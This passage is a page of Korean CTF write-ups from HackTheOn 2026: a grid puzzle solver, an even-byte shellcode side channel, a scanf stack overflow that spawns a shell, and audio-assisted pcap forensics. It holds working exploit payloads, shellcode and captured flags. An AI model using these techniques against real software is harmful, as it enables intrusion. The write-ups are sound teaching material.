@@ -1,0 +1,1631 @@
+<div class="tabbed-writeup" data-tab-group>
+  <p class="tabbed-writeup-intro">HackTheOn 2026 write-ups grouped into a single tabbed post.</p>
+  <div class="tabbed-writeup-nav" role="tablist" aria-label="HackTheOn 2026 writeup tabs">
+    <button class="tabbed-writeup-tab" type="button" role="tab" aria-selected="false" tabindex="-1" data-tab-trigger="cathedral-last-candle">CathedralOfTheLastCandle</button>
+    <button class="tabbed-writeup-tab" type="button" role="tab" aria-selected="false" tabindex="-1" data-tab-trigger="even-made">even_made</button>
+    <button class="tabbed-writeup-tab" type="button" role="tab" aria-selected="false" tabindex="-1" data-tab-trigger="immutable">Immutable</button>
+    <button class="tabbed-writeup-tab" type="button" role="tab" aria-selected="false" tabindex="-1" data-tab-trigger="plottergeist">plottergeist</button>
+    <button class="tabbed-writeup-tab" type="button" role="tab" aria-selected="false" tabindex="-1" data-tab-trigger="recover-it">Recover It!</button>
+    <button class="tabbed-writeup-tab" type="button" role="tab" aria-selected="false" tabindex="-1" data-tab-trigger="until-execute">Until_execute</button>
+  </div>
+
+{% capture cathedral_last_candle %}
+{% raw %}
+# CathedralOfTheLastCandle Write-up
+
+## 문제 정보
+
+- 카테고리: `misc`
+- 제목: `CathedralOfTheLastCandle`
+- 접속: `nc 3.35.223.94 9000`
+- 플래그: `hacktheon2026{81d2ef75640cce44e357a78f3a464bf43a62e42ccae4a6ae25d837d2b51faeb57582609d927331ea156c453a8278fc3c7a0d464e8a857838ede649bd359d247446b318237250da19}`
+
+## 요약
+
+이 문제는 `5 x 8` 격자 위의 40개 촛불을 모두 끄고, 마지막에 제단에서 `pray`를 입력하는 퍼즐이다.
+
+처음 보면 단순한 로컬 퍼즐처럼 보이지만 실제 핵심은 다르다.
+
+1. 각 칸은 보이지 않는 `bonded neighbor` 하나와 연결되어 있다.
+2. `ring`과 `hush`는 현재 칸과 그 이웃에 대해 `mod 3` 연산을 수행한다.
+3. 이 연결 구조는 접속할 때마다 바뀐다.
+4. 따라서 현재 세션의 그래프를 먼저 복원해야 한다.
+5. 복원한 그래프는 `(4,7)`로 모이는 rooted tree 구조이고, 이걸 트리 DP로 풀 수 있다.
+
+## 1. 서비스 관찰
+
+접속하면 아래와 같은 형태의 화면이 나온다.
+
+```text
+CATHEDRAL OF THE LAST CANDLE
+Pos:(0,0) Budget:300
+
+[~]   *    ?    ?    ?    ?    ?    ?
+ *    ?    ?    ?    ?    ?    ?    ?
+ ?    ?    ?    ?    ?    ?    ?    ?
+ ?    ?    ?    ?    ?    ?    ?    ?
+ ?    ?    ?    ?    ?    ?    ?    ?   dagger
+
+ring -> [a+b, a+2b] (mod 3)
+hush -> [2a+2b, 2a+b] (mod 3)
+a = this cell
+b = its bonded neighbor
+Commands: go [n/s/e/w], ring, hush, pray
+```
+
+여기서 바로 알 수 있는 점은 다음과 같다.
+
+- 보드는 `5 x 8`이다.
+- 상태는 `.`, `*`, `~` 세 가지다.
+- `?`는 아직 관찰되지 않은 칸이다.
+- 각 칸은 어떤 숨은 이웃과 연결되어 있다.
+- 목표는 모든 칸을 `.`으로 만들고 제단에서 `pray`를 하는 것이다.
+
+## 2. 상태를 mod 3 값으로 해석
+
+심볼을 숫자로 바꾸면 퍼즐이 깔끔해진다.
+
+- `.` -> `0`
+- `*` -> `1`
+- `~` -> `2`
+
+그러면 문제에 적힌 연산은 그대로 다음과 같다.
+
+```text
+ring(a, b) = (a + b, a + 2b) mod 3
+hush(a, b) = (2a + 2b, 2a + b) mod 3
+```
+
+행렬로 쓰면:
+
+```text
+R = [[1, 1],
+     [1, 2]]
+
+H = [[2, 2],
+     [2, 1]]
+```
+
+여기서 중요한 성질:
+
+- `H = R^-1`
+- `R^2 = -I`
+- `R^4 = I`
+
+이 성질 덕분에 탐색이 가능해진다.
+
+- `ring`을 1번 썼으면 `hush` 1번으로 복구 가능
+- `ring`을 2번 썼으면 `ring` 2번 더 써서 복구 가능
+
+즉, 어떤 칸의 bonded neighbor를 조사하더라도 보드를 원래 상태로 되돌릴 수 있다.
+
+## 3. 고정 퍼즐이 아니라 세션별 퍼즐
+
+처음에는 각 좌표의 bonded neighbor가 항상 같다고 생각하기 쉽다.  
+하지만 실제로는 그렇지 않았다.
+
+- 같은 좌표를 다른 세션에서 보면 연결 방향이 달라진다.
+- 반대로 한 세션 안에서는 연결이 고정된다.
+
+즉, 이 문제는 정답 커맨드를 하드코딩해서 푸는 문제가 아니다.  
+현재 접속한 세션의 그래프를 먼저 복원해야 한다.
+
+여러 칸에서 parent 방향을 따라가 보니 모든 경로가 `(4,7)`로 흘러갔다.  
+그래서 전체 구조를 `(4,7)`을 루트로 하는 rooted tree로 볼 수 있었다.
+
+## 4. bonded neighbor 복원
+
+각 칸에서 해야 할 일은 다음과 같다.
+
+1. 그 칸으로 이동한다.
+2. 현재 보드에서 보이는 값을 읽는다.
+3. `ring`을 사용해서 어떤 visible neighbor가 바뀌는지 본다.
+4. 바뀐 칸이 bonded neighbor다.
+5. 보드는 반드시 원상복구한다.
+
+### 4.1 왜 `ring` 1번만으로는 부족한가
+
+bonded neighbor의 현재 상태에 따라 첫 번째 `ring`에서는 변화가 보이지 않을 수 있다.  
+그래서 probing은 아래 규칙으로 했다.
+
+- 첫 `ring` 뒤에 visible neighbor 하나가 바뀌면 그 칸이 bonded neighbor
+  - 복구: `hush` 1번
+- 첫 `ring`에서는 안 드러나고, 두 번째 `ring` 뒤에 visible neighbor 하나가 바뀌면 그 칸이 bonded neighbor
+  - 복구: `ring` 2번
+- 두 번 해도 visible neighbor가 안 드러나면 특수 루트 `(4,7)`
+
+### 4.2 루트 `(4,7)`의 특수성
+
+`(4,7)`에서는 visible neighbor가 끝내 드러나지 않았다.  
+이 칸은 보드 안의 다른 촛불이 아니라 제단 쪽의 숨은 terminal과 연결된 것으로 보는 것이 자연스럽다.
+
+솔버에서는 이 칸만 별도 root 상태로 취급했다.
+
+## 5. 왜 트리 DP가 필요한가
+
+non-root 칸 `u`에서 `ring`이나 `hush`를 쓰면 두 값이 같이 바뀐다.
+
+- `u`
+- `parent(u)`
+
+즉, 어떤 서브트리를 정리하는 과정이 부모 상태를 바꾼다.  
+그래서 단순 DFS나 greedy로는 안정적으로 풀 수 없다.
+
+우리가 실제로 계산해야 하는 것은 다음이다.
+
+`부모 시작값이 주어졌을 때, 이 서브트리를 모두 정리해서 현재 노드를 0으로 만들고 부모를 원하는 값으로 끝내는 최소 비용은 얼마인가?`
+
+이 질문을 그대로 옮기면 트리 DP가 된다.
+
+## 6. DP 상태 설계
+
+### 6.1 non-root 노드
+
+non-root 노드 `u`에 대해 다음 상태를 사용했다.
+
+```text
+(processed_children_mask, current_u_value, current_parent_value)
+```
+
+전이는 두 종류다.
+
+- `self op`
+  - `u`에서 직접 `ring` 또는 `hush`
+  - `u`와 `parent(u)` 값이 함께 변함
+- `child solve`
+  - 어떤 child 서브트리를 먼저 해결
+  - child는 0으로 끝나고, 그 과정에서 `u` 값이 바뀔 수 있음
+
+최종적으로는 다음 형태의 계획을 구한다.
+
+```text
+plan[u][parent_start][parent_end]
+```
+
+의미:
+
+- 시작할 때 부모 값은 `parent_start`
+- 끝났을 때 현재 노드 `u == 0`
+- 부모 값은 `parent_end`
+- 그 조건을 만족하는 최소 연산 수열
+
+### 6.2 root 노드 `(4,7)`
+
+루트는 visible parent가 없으므로 상태가 더 단순하다.
+
+```text
+(processed_children_mask, current_root_value)
+```
+
+여기서는:
+
+- root에서 직접 `ring` / `hush`
+- child 서브트리 해결
+
+두 가지 전이만 있으면 된다.
+
+최종 목표는:
+
+```text
+all children processed
+root == 0
+pray
+```
+
+## 7. 솔버 구성
+
+최종 코드는 [solve_cathedral_last_candle.py](</C:/Users/jinse/OneDrive/문서/New project/solve_cathedral_last_candle.py>) 에 작성했다.
+
+흐름은 크게 세 단계다.
+
+### 7.1 탐색 단계
+
+- 서비스 접속
+- 40칸 전체 방문
+- 각 칸의 현재 값 기록
+- probing으로 bonded parent 복원
+- 전체 그래프가 rooted tree인지 검증
+
+### 7.2 최적화 단계
+
+- non-root DP 계산
+- root DP 계산
+- 최소 커맨드 수열 복원
+
+### 7.3 실행 단계
+
+- 같은 세션에 커맨드를 그대로 전송
+- 마지막에 `pray`
+- 응답에서 플래그 추출
+
+## 8. 핵심 probing 코드
+
+bonded neighbor를 안전하게 찾는 부분은 다음 로직이다.
+
+```python
+def probe_direction_restore(self) -> tuple[int, int] | None:
+    before = self.current_screen
+    after1 = self.send("ring")
+    ch1 = self.visible_changed_neighbors(before, after1)
+    if len(ch1) == 1:
+        self.send("hush")
+        _, cell = ch1[0]
+        return cell
+
+    after2 = self.send("ring")
+    ch2 = self.visible_changed_neighbors(after1, after2)
+    if len(ch2) == 1:
+        self.send("ring")
+        self.send("ring")
+        _, cell = ch2[0]
+        return cell
+
+    if self.pos != ROOT:
+        raise RuntimeError("no visible bonded neighbor at non-root")
+    self.send("ring")
+    return None
+```
+
+핵심은 "탐색 후 반드시 복구"다.  
+이게 가능하다는 점 때문에 그래프 복원과 실제 풀이를 같은 세션에서 이어서 할 수 있다.
+
+## 9. 실행 결과
+
+실행:
+
+```bash
+python solve_cathedral_last_candle.py
+```
+
+출력:
+
+```text
+budget_after=15
+command_count=123
+
+All candles grow dark.
+The cathedral draws a long, quiet breath.
+
+hacktheon2026{81d2ef75640cce44e357a78f3a464bf43a62e42ccae4a6ae25d837d2b51faeb57582609d927331ea156c453a8278fc3c7a0d464e8a857838ede649bd359d247446b318237250da19}
+```
+
+즉 최종 플래그는 다음과 같다.
+
+```text
+hacktheon2026{81d2ef75640cce44e357a78f3a464bf43a62e42ccae4a6ae25d837d2b51faeb57582609d927331ea156c453a8278fc3c7a0d464e8a857838ede649bd359d247446b318237250da19}
+```
+{% endraw %}
+{% endcapture %}
+  <section class="tabbed-writeup-panel" role="tabpanel" data-tab-panel="cathedral-last-candle" hidden>
+    <div class="tabbed-writeup-panel-copy">
+      {{ cathedral_last_candle | markdownify }}
+    </div>
+  </section>
+
+{% capture even_made %}
+{% raw %}
+﻿# even_made Writeup
+
+문제명: `even_made`  
+카테고리: `pwn`  
+플래그: `hacktheon2026{Ev3n_R3str1ct3d_Sh3lLc0d3_M4sT3r}`
+
+## 개요
+
+프로그램은 `./flag`를 전역 버퍼 `flag_mem`에 읽어 둔 뒤, `0x40400000`에 RWX 페이지를 매핑하고, 레지스터를 초기화하는 `stub` 뒤에 사용자가 입력한 shellcode를 붙여 실행한다.
+
+중요한 제약은 두 가지다.
+
+1. 사용자가 넣는 shellcode의 모든 바이트는 짝수여야 한다.
+2. `seccomp` 때문에 `nanosleep`만 허용된다.
+
+즉 일반적인 ORW shellcode나 `write` syscall 기반 출력은 전부 막혀 있다. 따라서 이 문제는 직접 출력이 아니라 사이드채널로 풀어야 한다.
+
+## 핵심 코드
+
+```c
+volatile char flag_mem[0x50] = {0};
+
+read(fd, (char*)flag_mem, 0x50);
+
+char* sh = (char*)mmap((void*)0x40400000, 0x1000,
+    PROT_READ | PROT_WRITE | PROT_EXEC,
+    MAP_ANONYMOUS | MAP_FIXED | MAP_PRIVATE, 0, 0);
+
+memset(sh, 0x90, 0x1000);
+memcpy(sh, stub, strlen(stub));
+
+int offset = sizeof(stub);
+int n = read(0, sh + offset, 0x900);
+
+for (int i = 0; i < n; i++) {
+    if ((unsigned char)(sh[offset + i]) & 1) {
+        printf("No odd bytes allowed!\n");
+        return 1;
+    }
+}
+
+mprotect(sh, 0x1000, PROT_READ | PROT_EXEC);
+ualarm(500, 0);
+sandbox();
+((void (*)(void))sh)();
+```
+
+여기서 중요한 점은 `stub`가 대부분의 일반 레지스터를 0으로 만들지만 `rsp`는 건드리지 않는다는 것이다. 즉 shellcode 진입 시점에도 `main`의 스택 프레임이 그대로 남아 있다.
+
+## 왜 직접 출력이 안 되는가
+
+`seccomp`에서 허용한 syscall은 `nanosleep` 하나뿐이다.
+
+따라서 다음은 전부 사용할 수 없다.
+
+- `write`
+- `open`
+- `read`
+- `exit`
+- `sigreturn`
+
+결국 메모리에서 플래그를 읽더라도 그 값을 바로 바깥으로 내보낼 수 없다.
+
+## 아이디어: 종료 시그널을 1비트 출력 채널로 사용
+
+원격 서비스는 바이너리를 `./run.sh`로 실행하고 있었고, 프로세스가 어떤 이유로 죽었는지를 문자열로 보여 줬다.
+
+- `Segmentation fault`
+- `Alarm clock`
+
+이 둘을 그대로 출력 채널로 쓰면 된다.
+
+- 비트가 `0`이면 `SIGSEGV`가 나게 만든다.
+- 비트가 `1`이면 무한 루프를 돌다가 `ualarm(500)`으로 `SIGALRM`이 나게 만든다.
+
+그러면 원격에서 보이는 문자열만으로 1비트를 읽을 수 있다.
+
+## 짝수 바이트만으로 쓸 수 있는 핵심 명령
+
+실제 풀이에는 아래 명령들만 있으면 충분하다.
+
+```asm
+58                      pop rax
+d0 a8 xx xx xx xx       shr byte ptr [rax+disp32], 1
+72 02                   jb +2
+00 00                   add byte ptr [rax], al
+e2 fe                   loop -2
+```
+
+핵심은 다음 명령이다.
+
+```asm
+shr byte ptr [rax+disp32], 1
+```
+
+이 명령은:
+
+- 메모리의 1바이트를 직접 읽고
+- 그 값을 제자리에서 오른쪽으로 1비트 밀며
+- 원래의 최하위 비트를 `CF`에 넣어 준다.
+
+즉 같은 바이트에 대해 이 명령을 `k + 1`번 반복하면, 원래 바이트의 `k`번째 비트를 `CF`로 꺼낼 수 있다.
+
+## 비트를 시그널로 바꾸는 구조
+
+한 비트를 읽는 shellcode의 구조는 아래와 같다.
+
+```asm
+; rax = 스택에서 꺼낸 PIE 내부 코드 포인터
+; [rax + disp32] = flag_mem[index]
+
+shr byte ptr [rax+disp32], 1
+shr byte ptr [rax+disp32], 1
+...
+shr byte ptr [rax+disp32], 1
+
+jb loop_forever
+add byte ptr [rax], al
+loop_forever:
+loop_forever:
+```
+
+동작은 단순하다.
+
+- `CF = 1`이면 `jb`가 점프한다.
+- 이후 `loop -2`를 계속 돌며 시간을 끈다.
+- `stub`가 `rcx`를 0으로 만들기 때문에 `loop`는 언더플로우 후 사실상 무한 루프처럼 동작한다.
+- 결국 `ualarm(500)` 때문에 프로세스가 `SIGALRM`으로 죽는다.
+
+반대로:
+
+- `CF = 0`이면 `jb`가 점프하지 않는다.
+- 바로 `add byte ptr [rax], al`이 실행된다.
+- `rax`는 PIE 텍스트 영역을 가리키므로 읽기 전용 메모리에 쓰기를 시도하게 된다.
+- 따라서 즉시 `SIGSEGV`가 난다.
+
+이렇게 해서 비트 하나를 관측 가능한 두 종류의 종료 원인으로 바꿀 수 있다.
+
+## `flag_mem`를 어떻게 가리켰는가
+
+`flag_mem`는 PIE 기준 고정 오프셋에 있다. 로컬 분석에서 `flag_mem`의 심볼 오프셋은 `0x4080`이었다.
+
+문제는 절대 주소를 모른다는 점인데, `rsp`가 살아 있으므로 스택에 남아 있는 저장된 리턴 주소와 코드 포인터를 활용할 수 있다.
+
+즉 `pop rax`를 여러 번 반복하면 스택 위의 PIE 내부 포인터 하나를 꺼낼 수 있다.
+
+디버깅하면 다음과 같은 값들이 스택에 남아 있었다.
+
+```text
+0x00005555555553fb
+0x0000555555555280
+```
+
+이 값들이 중요한 이유는 다음과 같다.
+
+```text
+0x555555555280 + 0x2e00 = 0x555555558080 = flag_mem
+0x5555555553fb + 0x2c85 = 0x555555558080 = flag_mem + 1
+```
+
+즉 적절한 스택 슬롯을 꺼낸 뒤 짝수 바이트로 표현 가능한 `disp32`를 더하면 `flag_mem[index]`에 도달할 수 있다.
+
+최종적으로 원격에서 맞는 값은 다음이었다.
+
+- 짝수 인덱스 바이트: `pop rax` 38번
+- 홀수 인덱스 바이트: `pop rax` 13번
+
+따라서 최종 메모리 참조는 다음처럼 만들 수 있다.
+
+- 짝수 인덱스 `i`: `[rax + (0x2e00 + i)]`
+- 홀수 인덱스 `i`: `[rax + (0x2c85 + i)]`
+
+## 왜 비트마다 새 연결이 필요한가
+
+`shr byte ptr [mem], 1`는 메모리를 파괴적으로 수정한다. 즉 한 번 비트를 읽으면 해당 바이트 값이 바뀐다.
+
+하지만 이 문제는 TCP 연결마다 새 프로세스를 실행한다. 그래서 매 연결마다 `flag_mem`는 원래 플래그 값으로 다시 초기화된다.
+
+따라서 전략은 다음과 같다.
+
+- 연결 1개로 비트 1개 읽기
+- 끊기
+- 새로 연결해서 다음 비트 읽기
+
+이 방식이면 파괴적 읽기여도 문제가 없다.
+
+## 원격 캘리브레이션
+
+홀수 인덱스용 스택 슬롯은 비교적 안정적이었지만, 짝수 인덱스용 슬롯은 로컬과 원격에서 `pop` 횟수가 달랐다.
+
+그래서 최종 풀이 스크립트는 플래그 접두사:
+
+```text
+hacktheon2026{
+```
+
+를 이용해서 스택 깊이를 자동으로 맞춘다.
+
+예를 들어 첫 글자 `h`는 `0x68 = 0b01101000` 이다. 후보 `pop` 횟수마다 몇 개 비트를 읽어 보고, 그 결과가 `h`의 비트 패턴과 일치하는 경우만 채택하면 된다.
+
+## 익스플로잇 흐름
+
+1. 원격 서비스에 접속한다.
+2. 짝수 인덱스용 `pop rax` 횟수를 캘리브레이션한다.
+3. 홀수 인덱스용 `pop rax` 횟수를 캘리브레이션한다.
+4. 각 문자에 대해 8비트를 읽는다.
+5. `}`가 나올 때까지 반복한다.
+
+## 사용한 스크립트
+
+재현용 스크립트는 아래 파일에 있다.
+
+- `solve_even_made.py`
+
+실행 예시는 다음과 같다.
+
+```bash
+cd even_made
+source .venv/bin/activate
+python3 solve_even_made.py 13.124.201.116
+```
+
+## 최종 플래그
+
+```text
+hacktheon2026{Ev3n_R3str1ct3d_Sh3lLc0d3_M4sT3r}
+```
+{% endraw %}
+{% endcapture %}
+  <section class="tabbed-writeup-panel" role="tabpanel" data-tab-panel="even-made" hidden>
+    <div class="tabbed-writeup-panel-copy">
+      {{ even_made | markdownify }}
+    </div>
+  </section>
+
+{% capture immutable %}
+{% raw %}
+# Immutable Write-up
+
+## 문제 정보
+
+- 제목: `Immutable`
+- 카테고리: `pwn`
+- 문제 설명: `How to change the immutable value?`
+- 원격 서버: `nc 3.37.44.62 33201`
+- 원격 서버: `nc 13.125.202.251 33201`
+
+## 제공 파일
+
+압축 파일에는 다음 파일이 들어 있다.
+
+- `deploy/immutable`
+- `deploy/run.sh`
+- `deploy/flag`
+- `Dockerfile`
+- `docker-compose.yml`
+
+서비스 실행 스크립트는 다음과 같다.
+
+```bash
+#!/bin/bash
+
+su ctf -c "timeout 120 /home/ctf/immutable"
+```
+
+즉, 별다른 래퍼 로직 없이 바이너리 하나만 실행되는 단순한 구조다. Dockerfile 기준 실행 환경은 Ubuntu 24.04다.
+
+## 초기 분석
+
+`file` 결과는 다음과 같다.
+
+```text
+immutable: ELF 64-bit LSB pie executable, x86-64, dynamically linked, not stripped
+```
+
+문자열과 심볼을 보면 다음 요소들이 눈에 띈다.
+
+- `__isoc99_scanf`
+- `printf`
+- `puts`
+- `system`
+- `/bin/sh`
+- `You win!`
+- `You lose..`
+
+여기서 이미 특정 조건을 만족하면 `system("/bin/sh")`로 셸을 따는 전형적인 문제라는 점을 예상할 수 있다.
+
+## main 함수 분석
+
+`main`을 디스어셈블하면 핵심 부분은 아래와 같다.
+
+```asm
+1257: lea    rax,[rbp-0x90]
+125e: mov    rsi,rax
+1261: lea    rax,[rip+0xdae]        # "%s"
+1270: call   __isoc99_scanf@plt
+
+1275: mov    eax,DWORD PTR [rbp-0x10]
+1278: cmp    eax,0xdeadbeef
+127d: jne    129f
+
+1289: call   puts@plt               ; "You win!"
+1298: call   system@plt             ; "/bin/sh"
+```
+
+여기서 중요한 점은 두 가지다.
+
+1. 입력을 `scanf("%s")`로 받기 때문에 길이 제한이 없다.
+2. `[rbp-0x10]` 위치의 4바이트 정수 값을 `0xdeadbeef`와 비교한다.
+
+입력 버퍼의 시작 주소는 `[rbp-0x90]`이다. 따라서 버퍼 시작점부터 비교 대상 정수까지의 거리는 다음과 같다.
+
+```text
+0x90 - 0x10 = 0x80
+```
+
+즉, 버퍼에 `0x80`바이트를 채운 뒤 4바이트를 더 덮으면 비교에 사용되는 "immutable value"를 직접 조작할 수 있다.
+
+## 취약점 설명
+
+취약점은 길이 제한 없는 `%s` 입력으로 발생하는 스택 버퍼 오버플로우다.
+
+```c
+scanf("%s", buf);
+```
+
+`%s`는 공백 문자나 널 바이트를 만날 때까지 계속 입력을 받으므로, 다음과 같은 payload를 넣을 수 있다.
+
+```text
+"A" * 0x80 + p32(0xdeadbeef)
+```
+
+`0xdeadbeef`를 리틀엔디언으로 쓰면 다음 바이트열이 된다.
+
+```text
+\xef\xbe\xad\xde
+```
+
+이 바이트들에는 `0x00`이나 공백 문자가 없기 때문에 `scanf("%s")`로 그대로 입력 가능하다.
+
+바이너리에는 카나리가 존재하지만, 이 문제에서는 중요하지 않다. 리턴 주소까지 덮을 필요가 없고, 바로 옆에 있는 지역 변수 `[rbp-0x10]`만 조작하면 되기 때문이다.
+
+## 익스플로잇 전략
+
+공격 흐름은 단순하다.
+
+1. `0x80`바이트 패딩을 입력한다.
+2. 비교 대상 정수를 `0xdeadbeef`로 덮는다.
+3. 조건문을 통과한다.
+4. 프로그램이 `system("/bin/sh")`를 호출한다.
+5. 열린 셸에 `cat flag`를 보내 플래그를 읽는다.
+
+최소 payload는 다음과 같다.
+
+```python
+payload = b"A" * 0x80 + (0xDEADBEEF).to_bytes(4, "little")
+```
+
+## 익스플로잇 스크립트
+
+사용한 스크립트는 다음 파일에 정리해 두었다.
+
+- `solve_immutable.py`
+
+핵심 로직은 아래와 같다.
+
+```python
+payload = b"A" * 0x80 + (0xDEADBEEF).to_bytes(4, "little")
+sock.sendall(payload + b"\n")
+sock.sendall(b"cat flag\nexit\n")
+```
+
+첫 줄로 조건 값을 덮고, 조건 통과 후 열린 셸에 `cat flag`를 보내 플래그를 읽는 방식이다.
+
+## 결과
+
+원격 서버에서 실제로 다음 플래그를 얻을 수 있었다.
+
+```text
+hacktheon2026{26b1a3a018766f68ee5aafdb13a3e33e3c1b977322f3404ca42912c3694424df0ab28f542e1129ccba8ca89201ecd17e333080e85aa3b0f3c4afee0c41eb5481a2829b9c07ddfaa6}
+```
+{% endraw %}
+{% endcapture %}
+  <section class="tabbed-writeup-panel" role="tabpanel" data-tab-panel="immutable" hidden>
+    <div class="tabbed-writeup-panel-copy">
+      {{ immutable | markdownify }}
+    </div>
+  </section>
+
+{% capture plottergeist %}
+{% raw %}
+# HackTheon 2026 Quals - `plottergeist` Write-up
+
+## TL;DR
+
+주어진 자료는 다음 두 개였다.
+
+- `plottergeist.pcap`
+- `bench_mic.wav`
+
+`pcap`에는 펜 플로터의 **이동 명령**만 기록되어 있었고,  
+실제로 잉크가 찍힌 이동인지 아닌지는 포함되어 있지 않았다.
+
+핵심은:
+
+1. `pcap`에서 **CoreXY 이동 경로**를 복원하고
+2. `wav`에서 각 이동 구간의 **음향 차이**를 이용해  
+   해당 이동이 **pen-down(draw)** 인지 **pen-up(travel)** 인지 분류하는 것
+
+이 과정을 통해 최종적으로 플로터가 그린 문자열을 복원할 수 있었고, flag는 다음과 같다.
+
+```text
+hacktheon2026{the_plotter_reveals_its_secret_through_sound}
+```
+
+---
+
+## 문제 해석
+
+문제 설명을 보면 이미 방향이 정해져 있다.
+
+- 컨트롤러 트래픽 로그는 **motion traffic만 보여준다**
+- 즉, 이동 정보는 있지만 **어떤 이동이 실제로 종이에 그려진 선인지**는 알 수 없다
+- 대신 마이크 녹음에는 이동 타입에 따라 **작지만 반복적인 차이**가 남아 있을 수 있다
+
+즉 이 문제는 단순히 pcap만 파싱해서 끝나는 문제가 아니라,
+
+- **이동 명령 복원**
+- **오디오 기반 이동 종류 분류**
+- **두 결과 결합**
+
+까지 해야 하는 문제였다.
+
+---
+
+## 파일 확인
+
+압축을 풀면 분석 대상은 다음 두 파일이었다.
+
+```text
+plottergeist.pcap
+bench_mic.wav
+```
+
+직감적으로도 구조가 명확하다.
+
+- `pcap` = 명령/프로토콜 분석
+- `wav` = 상태 판별 보조 정보
+
+---
+
+## 1. pcap 분석
+
+패킷을 열어보면 UDP 기반 통신이며, 초반에 포맷 힌트가 들어 있다.
+
+예를 들면 다음과 같은 문자열이 보인다.
+
+```text
+FMT:OP|SQ|DT|AM|BM
+```
+
+여기서 의미를 자연스럽게 추정할 수 있다.
+
+- `OP` : opcode
+- `SQ` : sequence
+- `DT` : duration
+- `AM` : A motor move
+- `BM` : B motor move
+
+실제 이동 패킷은 거의 전부 `0xA1` opcode를 사용했다.
+
+패킷 구조는 대략 다음처럼 해석할 수 있었다.
+
+```text
+A1 | seq(2B) | dt(2B) | A(2B) | B(2B) | 7E
+```
+
+즉, 각 명령은:
+
+- 시퀀스 번호
+- 이동 시간
+- 모터 A 이동량
+- 모터 B 이동량
+
+을 담고 있었다.
+
+`A`, `B`는 signed 16-bit처럼 해석하면 자연스럽게 맞아떨어졌다.
+
+---
+
+## 2. CoreXY 좌표 복원
+
+문제 설명에 “custom CoreXY pen plotter”라고 되어 있으므로,  
+A/B 모터 이동량을 XY 이동량으로 바꿔야 한다.
+
+CoreXY의 기본적인 좌표 변환은 다음과 같이 둘 수 있다.
+
+\[
+\Delta X = \frac{\Delta A + \Delta B}{2}, \qquad
+\Delta Y = \frac{\Delta A - \Delta B}{2}
+\]
+
+이 식으로 전체 이동을 누적해 보면 상당히 특징적인 패턴이 나온다.
+
+### 관찰된 패턴
+
+대부분의 명령은 다음과 비슷했다.
+
+- `A == B` 또는 거의 동일
+- 이 경우 `Y` 변화가 거의 없고 `X`만 이동
+
+즉, 대부분은 **수평 이동**이었다.
+
+그 사이사이에 가끔:
+
+- 큰 음수 방향의 수평 복귀
+- `Y`가 한 칸 증가하는 변화
+
+가 나타났다.
+
+이걸 종합하면 플로터의 동작 방식은 자유곡선이 아니라 거의 확실하게 다음과 같았다.
+
+- 한 줄을 가로로 스캔
+- 줄 끝에서 복귀
+- 다음 줄로 한 칸 이동
+- 다시 스캔
+
+즉 **래스터 방식(bitmap-like)** 으로 무언가를 그린 것이다.
+
+이 시점에서 이미 “이건 텍스트 비트맵일 가능성이 높다”는 감이 온다.
+
+---
+
+## 3. pcap만으로는 부족한 이유
+
+하지만 여기서 바로 이미지를 복원할 수는 없다.
+
+왜냐하면 `pcap`에는 **움직였다는 사실만** 있고,  
+그 이동이 실제로 잉크를 찍은 이동인지 아닌지가 없기 때문이다.
+
+예를 들어 같은 수평 이동이라도 실제로는 두 종류가 있다.
+
+- 펜이 내려간 상태의 이동 → 선이 그려짐
+- 펜이 올라간 상태의 이동 → 단순 이동, 선 없음
+
+문제 설명도 바로 이 점을 강조하고 있었다.
+
+따라서 `wav`를 활용해야 한다.
+
+---
+
+## 4. 오디오 분석 아이디어
+
+핵심 가설은 간단하다.
+
+> 펜이 종이에 닿아 있는 이동과, 닿아 있지 않은 이동은  
+> 모터 소리 외에 미세한 마찰 성분 차이가 있을 것이다.
+
+이 차이는 아주 작더라도, 로그 전체에서 반복된다면 통계적으로 분리할 수 있다.
+
+그래서 각 이동 명령에 대응하는 오디오 구간을 잘라서 특징값(feature)을 뽑아봤다.
+
+대표적으로 쓸 만한 값은 다음과 같다.
+
+- RMS
+- spectral centroid
+- 고주파 에너지 비율
+- zero-crossing rate
+
+이 중 특히 잘 들었던 건:
+
+- **spectral centroid**
+- **고주파 대역 비율**
+
+이었다.
+
+펜이 닿은 이동은 마찰 성분 때문에 약간 더 거칠고,  
+고주파 쪽 분포가 달라지는 경향이 있었다.
+
+---
+
+## 5. 중요한 디테일: pcap과 audio 시작점은 완벽히 일치하지 않음
+
+실제 분석에서 바로 맞지 않았던 부분이 하나 있었다.
+
+패킷 timestamp 기준 시작 시점과  
+오디오 파일의 실제 녹음 시작 시점이 완전히 일치하지 않았다.
+
+즉 다음 값이 필요했다.
+
+```text
+audio_time = packet_time + offset
+```
+
+이 `offset`을 조금씩 바꿔가며 실험해 보면,  
+특정 값 근처에서 복원 결과가 갑자기 읽을 수 있는 형태로 정리된다.
+
+내 경우에는 약 **-0.2초** 부근이 가장 잘 맞았다.
+
+이런 류 문제에서는 이 offset 튜닝이 꽤 중요하다.
+
+---
+
+## 6. 클러스터링으로 draw / travel 분리
+
+각 이동에 대해:
+
+- 시작 시각
+- 지속 시간
+- 해당 구간의 오디오 feature
+
+를 얻은 뒤, 이를 2개 그룹으로 나누면 된다.
+
+여기서는 단순하게 **KMeans(n_clusters=2)** 로도 충분했다.
+
+결과적으로 두 부류가 생긴다.
+
+- 클러스터 A
+- 클러스터 B
+
+이 중 어느 쪽이 실제 잉크 이동인지 판정해야 한다.  
+이건 이미지로 렌더링해 보면 바로 알 수 있다.
+
+- 한쪽은 지나치게 빽빽하고 의미 없는 배경처럼 나오고
+- 다른 한쪽은 글자 스트로크처럼 드문드문 남는다
+
+즉 **희소하게 남는 쪽**이 실제 draw 이동이었다.
+
+---
+
+## 7. 비트맵 렌더링
+
+이제 각 move에 대해 다음 정보를 알고 있다.
+
+- 시작점 `(x0, y0)`
+- 끝점 `(x1, y1)`
+- 해당 move가 draw인지 아닌지
+
+여기서 draw인 수평 이동만 bitmap에 칠하면 된다.
+
+개념적으로는 아래와 같다.
+
+```python
+if move_is_draw and y0 == y1:
+    bitmap[y0, min(x0, x1):max(x0, x1)] = 1
+```
+
+이렇게 행 단위로 쌓으면 7픽셀 높이 정도의 텍스트 비트맵이 나타난다.
+
+반전, crop, 약간의 정렬을 하면 문장이 읽힌다.
+
+---
+
+## 8. 복원된 문자열
+
+최종적으로 복원된 문장은 다음과 같았다.
+
+```text
+the_plotter_reveals_its_secret_through_sound
+```
+
+문제에서 요구한 flag 형식에 넣으면:
+
+```text
+hacktheon2026{the_plotter_reveals_its_secret_through_sound}
